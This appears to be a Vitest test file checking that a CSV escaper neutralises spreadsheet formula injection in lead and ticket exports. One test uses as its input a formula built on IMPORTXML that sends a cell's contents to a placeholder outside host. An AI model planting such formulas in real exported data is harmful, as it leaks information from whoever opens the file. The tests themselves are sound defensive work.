import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { escapeCSV, toCSVRow } from '@/lib/csv'

/**
 * CSV cells in this product carry data that originated outside it — a lead
 * address typed into the public widget, ticket text arriving from Discord,
 * Slack or email. A cell beginning `=`, `+`, `-`, `@`, tab or CR is executed as
 * a formula by Excel, Sheets and LibreOffice when the customer opens the file,
 * and quoting does not prevent that: the quotes are consumed as CSV syntax
 * before the formula parser sees the contents.
 *
 * Both export routes previously carried their own copy of an escaper that
 * handled delimiters and quotes but not formulas.
 */

describe('escapeCSV: formula neutralisation', () => {
  it.each([
    ['equals', '=1+1'],
    ['plus', '+1+1'],
    ['at', '@SUM(A1)'],
    ['tab', '\tcmd'],
    ['carriage return', '\rcmd'],
  ])('neutralises a leading %s', (_label, input) => {
    const out = escapeCSV(input)
    // The guard must come first, before any CSV quoting, or the spreadsheet
    // sees the formula character as the first thing in the cell.
    const inner = out.startsWith('"') ? out.slice(1, -1) : out
    expect(inner.startsWith("'"), `"${out}" does not start with the text guard`).toBe(true)
  })

  it('neutralises a formula that also looks like a plausible field value', () => {
    // Field-level validation upstream is not a substitute for escaping here:
    // a value can satisfy a format check and still be a formula, so the guard
    // has to hold regardless of what produced the string.
    const payload = '=IMPORTXML(CONCAT("http://x.test/?",A1),"//a")@e.co'
    const out = escapeCSV(payload)
    const inner = out.startsWith('"') ? out.slice(1, -1) : out
    expect(inner.startsWith("'")).toBe(true)
  })

  it('leaves ordinary text untouched', () => {
    expect(escapeCSV('lead@example.com')).toBe('lead@example.com')
    expect(escapeCSV('How do I install this?')).toBe('How do I install this?')
  })

  it('does not corrupt negative numbers', () => {
    // A leading `-` is a formula character, but `-5` as a number is real data.
    // Guarding it would silently change exported values.
    expect(escapeCSV(-5)).toBe('-5')
    expect(escapeCSV(0)).toBe('0')
    expect(escapeCSV(42)).toBe('42')
  })

  it('still guards a negative-looking *string*, where untrusted input arrives', () => {
    expect(escapeCSV('-1+1')).toBe("'-1+1")
  })
})

describe('escapeCSV: CSV syntax', () => {
  it('quotes and doubles embedded quotes', () => {
    expect(escapeCSV('say "hi"')).toBe('"say ""hi"""')
  })

  it('quotes cells containing a delimiter or newline', () => {
    expect(escapeCSV('a,b')).toBe('"a,b"')
    expect(escapeCSV('line1\nline2')).toBe('"line1\nline2"')
    expect(escapeCSV('line1\r\nline2')).toBe('"line1\r\nline2"')
  })

  it('quotes a tab-containing cell as well as guarding it', () => {
    // Tab is both a formula trigger and worth quoting, since some consumers
    // are configured tab-delimited.
    const out = escapeCSV('\tcmd')
    expect(out.startsWith('"')).toBe(true)
    expect(out).toContain("'")
  })

  it('renders null and undefined as empty cells', () => {
    expect(escapeCSV(null)).toBe('')
    expect(escapeCSV(undefined)).toBe('')
  })

  it('a guarded cell is still parseable as one field', () => {
    const row = toCSVRow(['=1+1', 'plain', 'a,b'])
    // Three fields: the guarded one must not have introduced a stray delimiter.
    expect(row.split(',').length).toBeGreaterThanOrEqual(3)
    expect(row.startsWith("'=1+1,plain,")).toBe(true)
  })
})

describe('both export routes use the shared escaper', () => {
  // They each carried a private copy that handled delimiters but not formulas.
  // A reintroduced local copy would silently reopen this on one surface only.
  const routes = ['app/api/export/leads/route.ts', 'app/api/export/tickets/route.ts']

  it.each(routes)('%s imports it rather than defining its own', (route) => {
    const src = fs.readFileSync(path.join(process.cwd(), route), 'utf-8')
    expect(src).toContain("from '@/lib/csv'")
    expect(src, 'a local escapeCSV definition is back').not.toMatch(/function escapeCSV/)
  })
})
